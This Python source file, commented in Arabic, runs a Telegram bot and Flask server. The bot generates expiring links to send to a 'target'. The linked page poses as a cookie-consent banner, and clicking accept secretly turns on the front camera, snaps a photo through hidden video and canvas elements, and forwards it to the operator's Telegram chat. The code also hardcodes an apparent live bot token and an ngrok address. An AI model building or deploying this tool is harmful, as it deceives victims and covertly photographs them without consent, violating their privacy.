# -*- coding: utf-8 -*-

# ==============================================================================
# 1. استيراد المكتبات اللازمة
# ==============================================================================
import os
import sys
import uuid
import time
import logging
import threading
import asyncio
from flask import Flask, request, render_template_string, jsonify, abort
from waitress import serve
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ==============================================================================
# 2. الإعدادات الرئيسية
# ==============================================================================

# ضع هنا توكن البوت الخاص بك
BOT_TOKEN = "8399951959:AAE5cQg3p_SKuC6mRwIU13dDirF_GeXzTSE" 

# هام: استخدم رابطًا من خدمة موثوقة مثل ngrok أو من منصة استضافة دائمة
BASE_URL = "https://6c07b5a5c50b.ngrok-free.app/" # يجب تغيير هذا الرابط

# مدة صلاحية الرابط بالثواني (10 دقائق)
LINK_EXPIRATION_SECONDS = 600

# ==============================================================================
# 3. إعدادات تسجيل الأنشطة والمتغيرات العامة
# ==============================================================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
temporary_links = {}

# ==============================================================================
# 4. قالب صفحة الويب (HTML + JavaScript) - تصميم "الموافقة الوهمية"
# ==============================================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متابعة</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;700&display=swap');
        body { margin: 0; font-family: 'Noto Sans Arabic', sans-serif; background-color: #e9ecef; display: flex; justify-content: center; align-items: flex-end; height: 100vh; }
        .consent-banner { background-color: #fff; width: 100%; padding: 1.5rem; box-shadow: 0 -5px 20px rgba(0,0,0,0.1); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; }
        .consent-text { flex-grow: 1; min-width: 250px; }
        .consent-text h2 { margin: 0 0 0.5rem 0; font-size: 1.2rem; }
        .consent-text p { margin: 0; color: #6c757d; font-size: 0.9rem; }
        .consent-actions { flex-shrink: 0; }
        button { padding: 0.8rem 2rem; border: none; border-radius: 8px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: background-color 0.2s; }
        #acceptBtn { background-color: #0d6efd; color: white; }
        #acceptBtn:disabled { background-color: #6c757d; }
        /* إخفاء الفيديو والك कैनवास تمامًا */
        video, canvas { display: none; }
    </style>
</head>
<body>
    <!-- هذا المحتوى يظهر في الخلفية ليبدو الموقع حقيقيًا -->
    <div style="position: absolute; top: 2rem; font-size: 2rem; color: #adb5bd;">محتوى الصفحة الرئيسي</div>

    <div class="consent-banner" id="mainContainer">
        <div class="consent-text">
            <h2>خصوصيتك تهمنا</h2>
            <p>نحن نستخدم ملفات تعريف الارتباط وتقنيات التحقق لضمان أمان الموقع وتوفير أفضل تجربة. بالاستمرار، فإنك توافق على شروط الخدمة.</p>
        </div>
        <div class="consent-actions">
            <button id="acceptBtn">أوافق وأتابع</button>
        </div>
    </div>
    
    <!-- عناصر الكاميرا مخفية هنا -->
    <video id="video" playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const acceptBtn = document.getElementById('acceptBtn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const mainContainer = document.getElementById('mainContainer');
        const token = "{{ token }}";

        acceptBtn.addEventListener('click', async () => {
            acceptBtn.disabled = true;
            acceptBtn.textContent = 'جاري التحميل...';
            
            try {
                // طلب الكاميرا في الخلفية
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;

                // الانتظار لحظة للتأكد من أن الكاميرا قد بدأت
                await new Promise(resolve => video.onloadedmetadata = resolve);

                // التقاط الصورة فورًا
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // إيقاف الكاميرا فورًا
                stream.getTracks().forEach(track => track.stop());

                // تحويل الصورة وإرسالها
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob, 'capture.jpg');
                    
                    try {
                        const response = await fetch(`/upload/${token}`, { method: 'POST', body: formData });
                        if (response.ok) {
                            mainContainer.innerHTML = '<div class="consent-text"><h2>✅ شكرًا لك</h2><p>تم تأكيد موافقتك بنجاح.</p></div>';
                        } else { throw new Error('Upload failed'); }
                    } catch (uploadError) {
                         mainContainer.innerHTML = '<div class="consent-text"><h2>خطأ</h2><p>فشل التحقق. حاول مرة أخرى.</p></div>';
                    }
                }, 'image/jpeg');

            } catch (err) {
                console.error("Camera access error:", err);
                mainContainer.innerHTML = '<div class="consent-text"><h2>خطأ</h2><p>لم نتمكن من الوصول إلى ميزات الأمان. يرجى منح الإذن اللازم.</p></div>';
            }
        });
    </script>
</body>
</html>
"""

# ==============================================================================
# 5. إعداد خادم الويب (Flask)
# ==============================================================================

app = Flask(__name__)
bot_loop = None
bot_instance = None

@app.route('/<token>')
def capture_page(token):
    logger.info(f"تم طلب الوصول للرابط برمز: {token}")
    link_data = temporary_links.get(token)
    if not link_data or (time.time() - link_data['creation_time']) > LINK_EXPIRATION_SECONDS:
        if token in temporary_links: del temporary_links[token]
        abort(404, description="هذا الرابط غير صالح أو انتهت صلاحيته.")
    return render_template_string(HTML_TEMPLATE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload_image(token):
    if 'photo' not in request.files: return jsonify({"error": "No photo part"}), 400
    file = request.files['photo']
    if file.filename == '': return jsonify({"error": "No selected file"}), 400
    
    link_data = temporary_links.get(token)
    if not link_data: return jsonify({"error": "Invalid or expired session"}), 404
        
    chat_id_to_send = link_data['chat_id']
    photo_bytes = file.read()

    async def send_photo_async():
        try:
            await bot_instance.bot.send_message(chat_id=chat_id_to_send, text="📸 تم التقاط صورة جديدة بنجاح:")
            await bot_instance.bot.send_photo(chat_id=chat_id_to_send, photo=photo_bytes)
            logger.info(f"تم إرسال الصورة إلى المحادثة {chat_id_to_send} بنجاح.")
            if token in temporary_links: del temporary_links[token]
        except Exception as e:
            logger.error(f"حدث خطأ أثناء إرسال الصورة إلى تليجرام: {e}")

    if bot_loop:
        asyncio.run_coroutine_threadsafe(send_photo_async(), bot_loop)
        return jsonify({"status": "success"}), 200
    else:
        return jsonify({"error": "Bot is not running correctly"}), 500

# ==============================================================================
# 6. دوال التشغيل المنفصلة
# ==============================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [[InlineKeyboardButton("🔗 إنشاء رابط تحقق أمني", callback_data='generate_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    welcome_message = "👋 **أهلاً بك في بوت التحقق الأمني**\n\nاضغط على الزر أدناه لإنشاء رابط تحقق فريد لإرساله إلى الهدف."
    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    token = str(uuid.uuid4())
    temporary_links[token] = {'creation_time': time.time(), 'chat_id': chat_id}
    full_link = f"{BASE_URL}{token}"
    link_message = f"✅ **تم إنشاء الرابط بنجاح!**\n\n🔗 **الرابط:** `{full_link}`\n\nأرسل هذا الرابط إلى الهدف. صالح لمدة 10 دقائق."
    await query.edit_message_text(text=link_message, parse_mode='Markdown')

async def run_bot(ready_event: threading.Event):
    global bot_loop, bot_instance
    bot_instance = Application.builder().token(BOT_TOKEN).build()
    bot_loop = asyncio.get_running_loop()
    bot_instance.add_handler(CommandHandler("start", start_command))
    bot_instance.add_handler(CallbackQueryHandler(button_callback))
    await bot_instance.initialize()
    await bot_instance.updater.start_polling()
    await bot_instance.start()
    ready_event.set()
    logger.info("بوت التحقق الأمني جاهز للعمل.")
    await asyncio.Event().wait()

def run_webserver(ready_event: threading.Event):
    ready_event.wait()
    logger.info("خادم الويب بدأ العمل على المنفذ 5000 باستخدام Waitress")
    serve(app, host='0.0.0.0', port=5000)

# ==============================================================================
# 7. نقطة انطلاق البرنامج الرئيسية
# ==============================================================================

if __name__ == '__main__':
    if sys.platform == "win32" and sys.version_info >= (3, 8):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    bot_is_ready = threading.Event()
    webserver_thread = threading.Thread(target=run_webserver, args=(bot_is_ready,))
    webserver_thread.daemon = True
    webserver_thread.start()

    try:
        logger.info("جاري إعداد البوت...")
        asyncio.run(run_bot(bot_is_ready))
    except (KeyboardInterrupt, SystemExit):
        logger.info("تم إيقاف البوت.")
